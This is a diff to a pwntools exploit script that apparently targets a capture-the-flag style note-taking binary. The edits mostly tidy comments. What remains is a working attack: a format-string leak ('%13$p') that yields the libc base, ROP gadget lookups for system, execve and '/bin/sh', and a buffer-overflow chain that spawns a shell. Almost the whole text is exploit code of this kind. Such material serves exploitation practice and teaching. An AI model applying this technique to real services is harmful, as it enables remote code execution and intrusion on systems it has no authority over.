@@ -17,7 +17,7 @@ rop = ROP(libc)
 p.recvuntil(b'Exit') 
 p.sendline(b'1') 
 p.recvuntil(b'note: ') 
-#p.sendline(b'%3$p') 
+# stack leak at index 13
 p.sendline(b'%13$p')
 p.recvuntil(b'Exit') 
 p.sendline(b'2') 
@@ -26,17 +26,14 @@ p.recvuntil(b"--- Your customer note ---\n")
 leak = int(p.recvline().strip(), 16) 
 print(leak)
 
-#objdump -d ./libc.so.6 | grep -B 1 "1ca:"
-#and look for something with call mov
+#with info proc mappings to find offset, could also have done it with info symbols 
 libc_base = leak - 0x2a1ca
  
-print(hex(libc_base & 0xfff))
 log.info(f"leak = {hex(leak)}")
 log.success(f"libc base: {libc_base:#x}")
 
 pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret'))) 
 ret = libc_base + rop.find_gadget(['ret'])[0]
-#ret = libc_base + next(libc.search(asm('ret'))) 
 bin_sh = libc_base + next(libc.search(b'/bin/sh')) 
 system = libc_base + libc.symbols['system'] 
 
@@ -69,7 +66,7 @@ print(f"[DEBUG] final prompt: {repr(data)}")
 
 pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
 pop_rsi = libc_base + next(libc.search(asm('pop rsi; ret')))
-pop_rdx = libc_base + next(libc.search(asm('pop rdx; ret')))  # or pop rdx; pop r12; ret
+pop_rdx = libc_base + next(libc.search(asm('pop rdx; ret')))  
 execve  = libc_base + libc.symbols['execve']
 bin_sh  = libc_base + next(libc.search(b'/bin/sh'))
 
@@ -81,8 +78,8 @@ stage2 = flat(
                            b'A' * OFFSET_TO_RIP, 
                            p64(ret), 
                            p64(pop_rdi), 
-                           p64(bin_sh), # address of "/bin/sh" 
-                           p64(system), # address of system 
+                           p64(bin_sh), 
+                           p64(system), 
                            ) 
 
 
